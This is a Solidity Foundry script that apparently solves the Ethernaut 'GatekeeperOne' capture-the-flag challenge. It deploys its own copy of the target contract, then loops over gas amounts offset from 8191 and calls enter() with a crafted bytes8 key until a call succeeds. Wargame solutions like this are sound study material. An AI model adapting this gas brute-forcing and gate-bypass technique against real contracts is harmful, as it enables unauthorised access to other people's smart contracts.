// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperOne} from "../src/GateKeeperOne.sol";

contract Hack {
    GatekeeperOne gateKeeperOne;
    uint256 counter;

    constructor(GatekeeperOne _gateKeeperOne) {
        gateKeeperOne = GatekeeperOne(_gateKeeperOne);
    }

    function hack() external {
        bytes8 gateKey = 0x0F0000000000F8FE;

        for (uint256 i = 0; i < 3000; i++) {
            (bool success, ) = address(gateKeeperOne).call{gas: i + (8191 * 1)}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}

contract GateKeeperOneHack is Script {
    GatekeeperOne public gateKeeperOne = new GatekeeperOne();

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Hack hack = new Hack(gateKeeperOne);
        hack.hack();
        console.log("entrant", gateKeeperOne.entrant());
        vm.stopBroadcast();
    }
}

// forge script script/GateKeeperOne.s.sol -vv --tc GateKeeperOneHack
// forge script script/GateKeeperOne.s.sol -vv --tc GateKeeperOneHack.sol --broadcast
